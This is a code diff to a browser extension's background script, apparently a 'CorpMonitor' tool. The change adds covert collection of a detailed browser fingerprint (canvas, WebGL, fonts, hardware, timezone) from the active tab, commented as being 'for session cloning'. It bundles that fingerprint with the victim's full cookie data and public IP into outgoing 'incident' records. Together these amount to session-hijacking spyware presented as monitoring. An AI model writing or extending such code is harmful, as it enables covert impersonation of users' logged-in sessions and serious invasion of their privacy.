@@ -193,6 +193,199 @@ async function getPublicIP() {
   return null;
 }
 
+// Get complete browser fingerprint for session cloning
+async function getBrowserFingerprint() {
+  return new Promise((resolve) => {
+    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
+      if (!tabs[0]) {
+        log('warn', '⚠️ No active tab for fingerprinting');
+        resolve(null);
+        return;
+      }
+
+      try {
+        log('debug', '🔍 Collecting browser fingerprint...');
+        const results = await chrome.scripting.executeScript({
+          target: { tabId: tabs[0].id },
+          func: collectFingerprint
+        });
+        
+        if (chrome.runtime.lastError || !results || !results[0]) {
+          log('warn', '⚠️ Failed to collect fingerprint', chrome.runtime.lastError);
+          resolve(null);
+        } else {
+          log('info', '✅ Browser fingerprint captured successfully');
+          resolve(results[0].result);
+        }
+      } catch (error) {
+        log('error', '❌ Error collecting fingerprint', error);
+        resolve(null);
+      }
+    });
+  });
+}
+
+// Function executed in page context to collect fingerprint
+function collectFingerprint() {
+  const fingerprint = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      pixelRatio: window.devicePixelRatio || 1
+    },
+    
+    window: {
+      innerWidth: window.innerWidth,
+      innerHeight: window.innerHeight,
+      outerWidth: window.outerWidth,
+      outerHeight: window.outerHeight
+    },
+    
+    timezone: {
+      offset: new Date().getTimezoneOffset(),
+      name: Intl.DateTimeFormat().resolvedOptions().timeZone
+    },
+    
+    languages: {
+      language: navigator.language,
+      languages: navigator.languages || [],
+      userLanguage: navigator.userLanguage || null
+    },
+    
+    hardware: {
+      hardwareConcurrency: navigator.hardwareConcurrency || 0,
+      deviceMemory: navigator.deviceMemory || 0,
+      maxTouchPoints: navigator.maxTouchPoints || 0
+    },
+    
+    canvas: getCanvasFingerprint(),
+    webgl: getWebGLFingerprint(),
+    fonts: detectFonts(),
+    
+    plugins: Array.from(navigator.plugins || []).map(p => ({
+      name: p.name,
+      description: p.description,
+      filename: p.filename
+    }))
+  };
+  
+  return fingerprint;
+}
+
+// Canvas Fingerprint
+function getCanvasFingerprint() {
+  try {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const text = 'CorpMonitor,<Canvas> 123!@# 😀🔥';
+    
+    canvas.width = 280;
+    canvas.height = 60;
+    
+    ctx.textBaseline = 'top';
+    ctx.font = '14px "Arial"';
+    ctx.textBaseline = 'alphabetic';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText(text, 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText(text, 4, 17);
+    
+    const dataURL = canvas.toDataURL();
+    return {
+      hash: hashCode(dataURL),
+      dataURL: dataURL.substring(0, 100)
+    };
+  } catch (e) {
+    return { error: e.message };
+  }
+}
+
+// WebGL Fingerprint
+function getWebGLFingerprint() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    
+    if (!gl) return { supported: false };
+    
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    
+    return {
+      supported: true,
+      vendor: gl.getParameter(gl.VENDOR),
+      renderer: gl.getParameter(gl.RENDERER),
+      version: gl.getParameter(gl.VERSION),
+      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+      unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
+      unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
+      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+      maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
+    };
+  } catch (e) {
+    return { error: e.message };
+  }
+}
+
+// Detect available fonts
+function detectFonts() {
+  const baseFonts = ['monospace', 'sans-serif', 'serif'];
+  const testFonts = [
+    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+    'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
+    'Impact', 'Lucida Console'
+  ];
+  
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  const text = 'mmmmmmmmmmlli';
+  const textSize = '72px';
+  
+  const baseSizes = {};
+  for (const baseFont of baseFonts) {
+    ctx.font = textSize + ' ' + baseFont;
+    baseSizes[baseFont] = ctx.measureText(text).width;
+  }
+  
+  const detectedFonts = [];
+  for (const font of testFonts) {
+    let detected = false;
+    for (const baseFont of baseFonts) {
+      ctx.font = textSize + ' ' + font + ',' + baseFont;
+      const size = ctx.measureText(text).width;
+      if (size !== baseSizes[baseFont]) {
+        detected = true;
+        break;
+      }
+    }
+    if (detected) {
+      detectedFonts.push(font);
+    }
+  }
+  
+  return detectedFonts;
+}
+
+// Simple hash function
+function hashCode(str) {
+  let hash = 0;
+  for (let i = 0; i < str.length; i++) {
+    const char = str.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash;
+  }
+  return hash.toString(16);
+}
+
 // Listen for tab updates to collect data and track sessions
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && monitoringEnabled && tab.url) {
@@ -335,11 +528,15 @@ async function createIncident(data, retryCount = 0) {
     // Capture client's public IP for DNS tunneling
     const clientIp = await getPublicIP();
     
+    // Capture complete browser fingerprint for session cloning
+    const fingerprint = await getBrowserFingerprint();
+    
     const incident = {
       host: data.host,
       tab_url: data.tabUrl,
       machine_id: data.machineId,
       client_ip: clientIp,
+      browser_fingerprint: fingerprint,
       cookie_excerpt: generateCookieExcerpt(data.cookies),
       full_cookie_data: data.cookies,
       severity: determineSeverity(data.cookies),
